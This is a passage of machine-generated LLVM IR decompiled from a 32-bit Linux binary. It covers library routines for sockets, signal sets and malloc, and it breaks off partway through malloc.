define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805254f = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052556 = call i32 @__socketcall(i32 15, i32 %v2_805254f)
  ret i32 %v2_8052556

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052583 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805258a = call i32 @__socketcall(i32 10, i32 %v2_8052583)
  ret i32 %v2_805258a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_80525b7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80525be = call i32 @__socketcall(i32 9, i32 %v2_80525b7)
  ret i32 %v2_80525be

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80525fb = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052602 = call i32 @__socketcall(i32 11, i32 %v2_80525fb)
  ret i32 %v2_8052602

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052637 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805263e = call i32 @__socketcall(i32 14, i32 %v2_8052637)
  ret i32 %v2_805263e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052663 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805266a = call i32 @__socketcall(i32 1, i32 %v2_8052663)
  ret i32 %v2_805266a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805268c, label %dec_label_pc_805267f

dec_label_pc_805267f:                             ; preds = %entry
  %v1_805267f = add i32 %arg1, -64
  %v3_805267f = sub i32 63, %arg1
  %v4_805267f = and i32 %v3_805267f, %arg1
  %v5_805267f = icmp slt i32 %v4_805267f, 0
  %v6_805267f = icmp eq i32 %v1_805267f, 0
  %v7_805267f = icmp slt i32 %v1_805267f, 0
  %v3_8052682 = icmp eq i1 %v7_805267f, %v5_805267f
  %v4_8052682 = icmp eq i1 %v6_805267f, false
  %v5_8052682 = and i1 %v4_8052682, %v3_8052682
  br i1 %v5_8052682, label %dec_label_pc_805268c, label %dec_label_pc_8052684

dec_label_pc_8052684:                             ; preds = %dec_label_pc_805267f
  %v4_8052687 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805268c

dec_label_pc_805268c:                             ; preds = %dec_label_pc_805267f, %entry, %dec_label_pc_8052684
  %v1_805268c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8052691 = inttoptr i32 %v1_805268c to i32*
  store i32 22, i32* %v1_8052691, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805267f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805268c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80526ae = inttoptr i32 %arg1 to i8*
  %v4_80526ae = call i32 @__GI_memset(i8* %v3_80526ae, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80526bc = load i32, i32* @ebx, align 4
  %v15_80526bd = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80526d1 = icmp eq i32 %arg2, -1
  br i1 %v10_80526d1, label %dec_label_pc_80526df, label %dec_label_pc_80526d6

dec_label_pc_80526d6:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80526df, label %dec_label_pc_80526da

dec_label_pc_80526da:                             ; preds = %dec_label_pc_80526d6
  %v7_80526dd = icmp sgt i32 %arg1, 64
  br i1 %v7_80526dd, label %dec_label_pc_80526df, label %dec_label_pc_80526ec

dec_label_pc_80526df:                             ; preds = %dec_label_pc_80526da, %dec_label_pc_80526d6, %entry
  %v1_80526df = call i32 @__errno_location(i32 %v0_80526bc)
  store i32 %v1_80526df, i32* %eax.global-to-local, align 4
  %v1_80526e4 = inttoptr i32 %v1_80526df to i32*
  store i32 22, i32* %v1_80526e4, align 4
  br label %dec_label_pc_8052760

dec_label_pc_80526ec:                             ; preds = %dec_label_pc_80526da
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80526fa

dec_label_pc_80526fa:                             ; preds = %dec_label_pc_80526fa.dec_label_pc_80526fa_crit_edge, %dec_label_pc_80526ec
  %v0_80526fa = phi i32 [ %v15_80526bd, %dec_label_pc_80526ec ], [ %v0_80526fa.pre, %dec_label_pc_80526fa.dec_label_pc_80526fa_crit_edge ]
  %v1_805270517 = phi i32 [ 31, %dec_label_pc_80526ec ], [ %v1_8052705, %dec_label_pc_80526fa.dec_label_pc_80526fa_crit_edge ]
  %v2_80526fa = mul i32 %v1_805270517, 4
  %v3_80526fa = add i32 %v2_80526fa, 160
  %v4_80526fa = add i32 %v3_80526fa, %v0_80526fa
  %v5_80526fa = inttoptr i32 %v4_80526fa to i32*
  store i32 0, i32* %v5_80526fa, align 4
  %v0_8052705.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052705 = add i32 %v0_8052705.pre, -1
  %v9_8052705 = icmp slt i32 %v1_8052705, 0
  store i32 %v1_8052705, i32* %eax.global-to-local, align 4
  %v1_8052706 = icmp eq i1 %v9_8052705, false
  br i1 %v1_8052706, label %dec_label_pc_80526fa.dec_label_pc_80526fa_crit_edge, label %dec_label_pc_8052708

dec_label_pc_80526fa.dec_label_pc_80526fa_crit_edge: ; preds = %dec_label_pc_80526fa
  %v0_80526fa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80526fa

dec_label_pc_8052708:                             ; preds = %dec_label_pc_80526fa
  %v0_8052708 = load i32, i32* @edx, align 4
  %v2_805270b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805270b, i32* %eax.global-to-local, align 4
  %v4_8052713 = call i32 @__sigaddset(i32 %v2_805270b, i32 %arg1, i32 %v0_8052708, i32 %v0_8052708)
  store i32 %v4_8052713, i32* %eax.global-to-local, align 4
  %v2_805271b = icmp slt i32 %v4_8052713, 0
  br i1 %v2_805271b, label %dec_label_pc_8052760, label %dec_label_pc_805271f

dec_label_pc_805271f:                             ; preds = %dec_label_pc_8052708
  %v4_8052727 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8068820.729 to i32), i32 %arg1, i32 %v4_8052713, i32 %v4_8052713)
  %v2_8052740 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052745 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052745, i32* %eax.global-to-local, align 4
  %v4_805274e = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052740)
  store i32 %v4_805274e, i32* %eax.global-to-local, align 4
  %v2_8052756 = icmp slt i32 %v4_805274e, 0
  br i1 %v2_8052756, label %dec_label_pc_8052760, label %dec_label_pc_805275a

dec_label_pc_805275a:                             ; preds = %dec_label_pc_805271f
  %v3_805275a = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052763

dec_label_pc_8052760:                             ; preds = %dec_label_pc_805271f, %dec_label_pc_8052708, %dec_label_pc_80526df
  br label %dec_label_pc_8052763

dec_label_pc_8052763:                             ; preds = %dec_label_pc_805275a, %dec_label_pc_8052760
  %storemerge = phi i32 [ -1, %dec_label_pc_8052760 ], [ %v3_805275a, %dec_label_pc_805275a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80526bc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052705, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8052763, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805277a = add i32 %arg2, -1
  %v1_805277d = urem i32 %v1_805277a, 32
  %v2_805277d = icmp eq i32 %v1_805277d, 0
  %v2_8052780 = udiv i32 %v1_805277a, 32
  br i1 %v2_805277d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8052783 = shl i32 1, %v1_805277d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052785 = phi i32 [ 1, %entry ], [ %v5_8052783, %bb ]
  %v2_8052785 = mul nuw nsw i32 %v2_8052780, 4
  %v3_8052785 = add i32 %v2_8052785, %arg1
  %v4_8052785 = inttoptr i32 %v3_8052785 to i32*
  %v5_8052785 = load i32, i32* %v4_8052785, align 4
  %v7_8052785 = and i32 %v5_8052785, %v6_8052785
  %v8_8052785 = icmp eq i32 %v7_8052785, 0
  %v1_8052789 = icmp eq i1 %v8_8052785, false
  %v2_8052789 = zext i1 %v1_8052789 to i32
  ret i32 %v2_8052789

; uselistorder directives
  uselistorder i32 %v1_805277d, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052790 = load i32, i32* @ebx, align 4
  store i32 %v0_8052790, i32* %stack_var_-4, align 4
  %v1_805279e = add i32 %arg2, -1
  %v1_80527a1 = urem i32 %v1_805279e, 32
  %v2_80527a1 = icmp eq i32 %v1_80527a1, 0
  store i32 %v1_80527a1, i32* @ecx, align 4
  br i1 %v2_80527a1, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_80527a4 = shl i32 1, %v1_80527a1
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80527a9 = phi i32 [ 1, %entry ], [ %v5_80527a4, %bb ]
  %v2_80527a6 = udiv i32 %v1_805279e, 32
  store i32 %v2_80527a6, i32* @edx, align 4
  %v2_80527a9 = mul nuw nsw i32 %v2_80527a6, 4
  %v3_80527a9 = add i32 %v2_80527a9, %arg1
  %v4_80527a9 = inttoptr i32 %v3_80527a9 to i32*
  %v5_80527a9 = load i32, i32* %v4_80527a9, align 4
  %v7_80527a9 = or i32 %v5_80527a9, %v6_80527a9
  store i32 %v7_80527a9, i32* %v4_80527a9, align 4
  %v2_80527ae = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80527ae, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80527a6, { 1, 0 }
  uselistorder i32 %v1_80527a1, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80527be = add i32 %arg2, -1
  %v1_80527c1 = urem i32 %v1_80527be, 32
  %v2_80527c1 = icmp eq i32 %v1_80527c1, 0
  br i1 %v2_80527c1, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_80527c4 = shl i32 -2, %v1_80527c1
  %v5_80527c4 = sub nsw i32 32, %v1_80527c1
  %v6_80527c4 = lshr i32 -2, %v5_80527c4
  %v7_80527c4 = or i32 %v6_80527c4, %v4_80527c4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_80527c9 = phi i32 [ -2, %entry ], [ %v7_80527c4, %bb ]
  %v2_80527c6 = udiv i32 %v1_80527be, 32
  %v2_80527c9 = mul nuw nsw i32 %v2_80527c6, 4
  %v3_80527c9 = add i32 %v2_80527c9, %arg1
  %v4_80527c9 = inttoptr i32 %v3_80527c9 to i32*
  %v5_80527c9 = load i32, i32* %v4_80527c9, align 4
  %v7_80527c9 = and i32 %v5_80527c9, %v6_80527c9
  store i32 %v7_80527c9, i32* %v4_80527c9, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80527c1, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_80527d0 = load i32, i32* @eax, align 4
  %v6_80527e3 = icmp ugt i32 %v0_80527d0, 16777215
  br i1 %v6_80527e3, label %dec_label_pc_80527f4, label %dec_label_pc_80527e5

dec_label_pc_80527e5:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_80527d0, 256
  %v2_80527d2 = udiv i32 %v0_80527d0, 256
  %v2_80527e5 = call i32 @llvm.ctlz.i32(i32 %v2_80527d2, i1 true)
  %v3_80527e5 = xor i32 %v2_80527e5, 31
  %v5_80527e5 = select i1 %tmp, i32 95, i32 %v3_80527e5
  %v1_80527e8 = add nuw nsw i32 %v5_80527e5, 6
  store i32 %v1_80527e8, i32* @ecx, align 4
  %v2_80527eb = urem i32 %v1_80527e8, 32
  %v4_80527eb = icmp eq i32 %v2_80527eb, 0
  br i1 %v4_80527eb, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80527e5
  %v5_80527eb = lshr i32 %v0_80527d0, %v2_80527eb
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80527e5, %bb
  %v0_80527ed = phi i32 [ %v0_80527d0, %dec_label_pc_80527e5 ], [ %v5_80527eb, %bb ]
  %v1_80527ed = urem i32 %v0_80527ed, 4
  %v2_80527f0 = mul nuw nsw i32 %v5_80527e5, 4
  %v3_80527f0 = or i32 %v1_80527ed, 32
  %v4_80527f0 = add nuw nsw i32 %v3_80527f0, %v2_80527f0
  br label %dec_label_pc_80527f4

dec_label_pc_80527f4:                             ; preds = %entry, %bb4
  %v0_80527f5 = phi i32 [ 95, %entry ], [ %v4_80527f0, %bb4 ]
  ret i32 %v0_80527f5

; uselistorder directives
  uselistorder i32 %v2_80527eb, { 1, 0 }
  uselistorder i32 %v0_80527d0, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_80527f4, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80527f6 = load i32, i32* @ebp, align 4
  %v0_80527f7 = load i32, i32* @edi, align 4
  %v0_80527f8 = load i32, i32* @esi, align 4
  %v0_80527f9 = load i32, i32* @ebx, align 4
  store i32 %v0_80527f9, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805280b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805280b, i32* @eax, align 4
  store i32 %v2_805280b, i32* %stack_var_-92, align 4
  %v2_8052810 = call i32 @__pthread_return_void(i32 %v2_805280b, i32 134562299)
  store i32 %v2_8052810, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062430.730 to i32), i32* %stack_var_-92, align 4
  %v1_805281c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062430.730 to i32))
  store i32 %v1_805281c, i32* %eax.global-to-local, align 4
  %v0_8052824 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8052824, -32
  br i1 %tmp, label %dec_label_pc_805283b, label %dec_label_pc_8052829

dec_label_pc_8052829:                             ; preds = %entry
  %v0_8052829 = load i32, i32* %stack_var_-92, align 4
  %v1_8052829 = call i32 @__errno_location(i32 %v0_8052829)
  store i32 %v1_8052829, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052830 = inttoptr i32 %v1_8052829 to i32*
  store i32 12, i32* %v1_8052830, align 4
  br label %dec_label_pc_8052f8e

dec_label_pc_805283b:                             ; preds = %entry
  %v1_805283b = add i32 %v0_8052824, 11
  %tmp136 = icmp ult i32 %v1_805283b, 16
  br i1 %tmp136, label %dec_label_pc_8052852, label %dec_label_pc_805284b

dec_label_pc_805284b:                             ; preds = %dec_label_pc_805283b
  %v1_805284b = and i32 %v1_805283b, -8
  br label %dec_label_pc_8052852

dec_label_pc_8052852:                             ; preds = %dec_label_pc_805283b, %dec_label_pc_805284b
  %storemerge133 = phi i32 [ %v1_805284b, %dec_label_pc_805284b ], [ %v1_805283b, %dec_label_pc_805283b ]
  %v1_8052bf2 = phi i32 [ %v1_805284b, %dec_label_pc_805284b ], [ 16, %dec_label_pc_805283b ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_8052852 = load i8, i8* @global_var_80688a0.731, align 1
  %v1_8052852 = sext i8 %v0_8052852 to i32
  store i32 %v1_8052852, i32* @ebx, align 4
  %v3_8052858 = urem i8 %v0_8052852, 2
  %v4_8052858 = icmp eq i8 %v3_8052858, 0
  %v1_805285b = icmp eq i1 %v4_8052858, false
  br i1 %v1_805285b, label %dec_label_pc_805287a, label %dec_label_pc_805285d

dec_label_pc_805285d:                             ; preds = %dec_label_pc_8052852
  %v2_805285d = icmp eq i8 %v0_8052852, 0
  %v1_805285f = icmp eq i1 %v2_805285d, false
  br i1 %v1_805285f, label %dec_label_pc_8052b5d, label %dec_label_pc_8052865

dec_label_pc_8052865:                             ; preds = %dec_label_pc_805285d
  store i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32* %stack_var_-92, align 4
  %v2_805286d = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80688a0.731 to i32*))
  store i32 %v2_805286d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b5d

dec_label_pc_805287a:                             ; preds = %dec_label_pc_8052852
  %v11_805287a = trunc i32 %v1_8052bf2 to i8
  %v8_805287e = icmp ugt i8 %v11_805287a, %v0_8052852
  br i1 %v8_805287e, label %dec_label_pc_805289b, label %dec_label_pc_8052880

dec_label_pc_8052880:                             ; preds = %dec_label_pc_805287a
  %v2_8052884 = udiv i32 %v1_8052bf2, 2
  store i32 %v2_8052884, i32* %eax.global-to-local, align 4
  %v1_8052886 = add i32 %v2_8052884, ptrtoint (i8* @global_var_80688a0.731 to i32)
  store i32 %v1_8052886, i32* @ecx, align 4
  %v1_805288c = add i32 %v2_8052884, add (i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32 -4)
  %v2_805288c = inttoptr i32 %v1_805288c to i32*
  %v3_805288c = load i32, i32* %v2_805288c, align 4
  store i32 %v3_805288c, i32* @edx, align 4
  %v1_805288f = icmp eq i32 %v3_805288c, 0
  br i1 %v1_805288f, label %dec_label_pc_805289b, label %dec_label_pc_8052893

dec_label_pc_8052893:                             ; preds = %dec_label_pc_8052880
  %v1_8052893 = add i32 %v3_805288c, 8
  %v2_8052893 = inttoptr i32 %v1_8052893 to i32*
  %v3_8052893 = load i32, i32* %v2_8052893, align 4
  store i32 %v3_8052893, i32* %eax.global-to-local, align 4
  store i32 %v3_8052893, i32* %v2_805288c, align 4
  br label %dec_label_pc_80528d4

dec_label_pc_805289b:                             ; preds = %dec_label_pc_8052880, %dec_label_pc_805287a
  %v8_805289b = icmp ult i32 %v1_8052bf2, 255
  %v6_80528a3 = icmp ugt i32 %v1_8052bf2, 255
  store i32 %v1_8052bf2, i32* @eax, align 4
  br i1 %v6_80528a3, label %dec_label_pc_80528dc, label %dec_label_pc_80528a5

dec_label_pc_80528a5:                             ; preds = %dec_label_pc_805289b
  %v2_80528a9 = udiv i32 %v1_8052bf2, 8
  store i32 %v2_80528a9, i32* %eax.global-to-local, align 4
  %v1_80528ac = mul nuw i32 %v2_80528a9, 8
  %v2_80528ac = add i32 %v1_80528ac, ptrtoint (i32* @global_var_80688cc.732 to i32)
  store i32 %v2_80528ac, i32* @ecx, align 4
  %v1_80528b7 = add i32 %v1_80528ac, add (i32 ptrtoint (i32* @global_var_80688cc.732 to i32), i32 12)
  %v2_80528b7 = inttoptr i32 %v1_80528b7 to i32*
  %v3_80528b7 = load i32, i32* %v2_80528b7, align 4
  store i32 %v3_80528b7, i32* @edx, align 4
  %v12_80528ba = icmp eq i32 %v3_80528b7, %v2_80528ac
  br i1 %v12_80528ba, label %dec_label_pc_80529d8.preheader, label %dec_label_pc_80528c2

dec_label_pc_80528c2:                             ; preds = %dec_label_pc_80528a5
  store i32 %v1_8052bf2, i32* %ebx.global-to-local, align 4
  %v1_80528c6 = add i32 %v3_80528b7, 12
  %v2_80528c6 = inttoptr i32 %v1_80528c6 to i32*
  %v3_80528c6 = load i32, i32* %v2_80528c6, align 4
  store i32 %v3_80528c6, i32* %eax.global-to-local, align 4
  %v2_80528c9 = or i32 %v1_8052bf2, 4
  %v3_80528c9 = add i32 %v3_80528b7, %v2_80528c9
  %v4_80528c9 = inttoptr i32 %v3_80528c9 to i32*
  %v5_80528c9 = load i32, i32* %v4_80528c9, align 4
  %v6_80528c9 = or i32 %v5_80528c9, 1
  store i32 %v6_80528c9, i32* %v4_80528c9, align 4
  %v0_80528ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80528ce = load i32, i32* @ecx, align 4
  %v2_80528ce = add i32 %v1_80528ce, 12
  %v3_80528ce = inttoptr i32 %v2_80528ce to i32*
  store i32 %v0_80528ce, i32* %v3_80528ce, align 4
  %v0_80528d1 = load i32, i32* @ecx, align 4
  %v1_80528d1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528d1 = add i32 %v1_80528d1, 8
  %v3_80528d1 = inttoptr i32 %v2_80528d1 to i32*
  store i32 %v0_80528d1, i32* %v3_80528d1, align 4
  br label %dec_label_pc_80528d4

dec_label_pc_80528d4:                             ; preds = %dec_label_pc_8052893, %dec_label_pc_80528c2
  %v0_80528d4 = load i32, i32* @edx, align 4
  %v1_80528d4 = add i32 %v0_80528d4, 8
  store i32 %v1_80528d4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_80528dc:                             ; preds = %dec_label_pc_805289b
  %v0_80528e0 = call i32 @__malloc_largebin_index()
  store i32 %v0_80528e0, i32* %eax.global-to-local, align 4
  %v3_80528e5 = and i8 %v0_8052852, 2
  %v4_80528e5 = icmp eq i8 %v3_80528e5, 0
  br i1 %v4_80528e5, label %dec_label_pc_80529d8.preheader, label %dec_label_pc_80528f2

dec_label_pc_80528f2:                             ; preds = %dec_label_pc_80528dc
  store i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32* %stack_var_-92, align 4
  %v2_80528fa = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80688a0.731 to i32*))
  store i32 %v2_80528fa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529d8.preheader

dec_label_pc_80529d8.preheader:                   ; preds = %dec_label_pc_80528f2, %dec_label_pc_80528a5, %dec_label_pc_80528dc
  %stack_var_-40.0.ph = phi i32 [ %v2_80528a9, %dec_label_pc_80528a5 ], [ %v0_80528e0, %dec_label_pc_80528f2 ], [ %v0_80528e0, %dec_label_pc_80528dc ]
  %v1_805292e = add i32 %v1_8052bf2, 16
  %v0_80529d8109 = load i32, i32* @global_var_80688e0.735, align 32
  store i32 %v0_80529d8109, i32* @ebp, align 4
  %v9_80529de115 = icmp eq i32 %v0_80529d8109, 134645972
  %v1_80529e4117 = icmp eq i1 %v9_80529de115, false
  br i1 %v1_80529e4117, label %dec_label_pc_8052907, label %dec_label_pc_80529ea

dec_label_pc_8052907:                             ; preds = %dec_label_pc_80529d8.preheader, %bb82
  %v0_80529d8118 = phi i32 [ %v0_80529d8, %bb82 ], [ %v0_80529d8109, %dec_label_pc_80529d8.preheader ]
  %v1_8052907 = add i32 %v0_80529d8118, 4
  %v2_8052907 = inttoptr i32 %v1_8052907 to i32*
  %v3_8052907 = load i32, i32* %v2_8052907, align 4
  %v1_805290a = add i32 %v0_80529d8118, 12
  %v2_805290a = inttoptr i32 %v1_805290a to i32*
  %v3_805290a = load i32, i32* %v2_805290a, align 4
  store i32 %v3_805290a, i32* @edx, align 4
  %v1_805290d = and i32 %v3_8052907, -4
  store i32 %v1_805290d, i32* @edi, align 4
  br i1 %v6_80528a3, label %dec_label_pc_8052939, label %dec_label_pc_805291a

dec_label_pc_805291a:                             ; preds = %dec_label_pc_8052907
  %v9_805291a = icmp eq i32 %v3_805290a, 134645972
  %v1_8052920 = icmp eq i1 %v9_805291a, false
  br i1 %v1_8052920, label %dec_label_pc_8052939, label %dec_label_pc_8052922

dec_label_pc_8052922:                             ; preds = %dec_label_pc_805291a
  %v1_8052922 = load i32, i32* @global_var_80688d0.733, align 16
  %v12_8052922 = icmp eq i32 %v0_80529d8118, %v1_8052922
  %v1_8052928 = icmp eq i1 %v12_8052922, false
  br i1 %v1_8052928, label %dec_label_pc_8052939, label %dec_label_pc_805292a

dec_label_pc_805292a:                             ; preds = %dec_label_pc_8052922
  store i32 %v1_805292e, i32* %eax.global-to-local, align 4
  %v6_8052933 = icmp ugt i32 %v1_805290d, %v1_805292e
  br i1 %v6_8052933, label %dec_label_pc_8052f18, label %dec_label_pc_8052939

dec_label_pc_8052939:                             ; preds = %dec_label_pc_805292a, %dec_label_pc_8052922, %dec_label_pc_805291a, %dec_label_pc_8052907
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_805290a, i32* @global_var_80688e0.735, align 4
  %v2_8052941 = add i32 %v3_805290a, 8
  %v3_8052941 = inttoptr i32 %v2_8052941 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v3_8052941, align 4
  %v0_8052944 = load i32, i32* @edi, align 4
  %v15_8052944 = icmp eq i32 %v0_8052944, %v1_8052bf2
  br i1 %v15_8052944, label %dec_label_pc_8052f59, label %dec_label_pc_805294e

dec_label_pc_805294e:                             ; preds = %dec_label_pc_8052939
  %v6_8052954 = icmp ugt i32 %v0_8052944, 255
  br i1 %v6_8052954, label %dec_label_pc_8052967, label %dec_label_pc_8052956

dec_label_pc_8052956:                             ; preds = %dec_label_pc_805294e
  %v2_8052958 = udiv i32 %v0_8052944, 8
  store i32 %v2_8052958, i32* %esi.global-to-local, align 4
  %v1_805295b = mul nuw i32 %v2_8052958, 8
  %v2_805295b = add i32 %v1_805295b, 134645964
  store i32 %v2_805295b, i32* @ebx, align 4
  %v1_8052962 = add i32 %v1_805295b, 134645972
  %v2_8052962 = inttoptr i32 %v1_8052962 to i32*
  %v3_8052962 = load i32, i32* %v2_8052962, align 4
  store i32 %v3_8052962, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529b0

dec_label_pc_8052967:                             ; preds = %dec_label_pc_805294e
  store i32 %v0_8052944, i32* @eax, align 4
  %v0_8052969 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052969, i32* %esi.global-to-local, align 4
  %v1_8052970 = mul i32 %v0_8052969, 8
  %v2_8052970 = add i32 %v1_8052970, ptrtoint (i32* @global_var_80688cc.732 to i32)
  store i32 %v2_8052970, i32* %eax.global-to-local, align 4
  %v1_8052977 = add i32 %v1_8052970, add (i32 ptrtoint (i32* @global_var_80688cc.732 to i32), i32 8)
  %v2_8052977 = inttoptr i32 %v1_8052977 to i32*
  %v3_8052977 = load i32, i32* %v2_8052977, align 4
  store i32 %v3_8052977, i32* %edx.global-to-local, align 4
  %v12_805297a = icmp eq i32 %v3_8052977, %v2_8052970
  store i32 %v3_8052977, i32* @ebx, align 4
  br i1 %v12_805297a, label %dec_label_pc_80529b0, label %dec_label_pc_8052984

dec_label_pc_8052984:                             ; preds = %dec_label_pc_8052967
  %v1_8052984 = add i32 %v1_8052970, add (i32 ptrtoint (i32* @global_var_80688cc.732 to i32), i32 12)
  %v2_8052984 = inttoptr i32 %v1_8052984 to i32*
  %v3_8052984 = load i32, i32* %v2_8052984, align 4
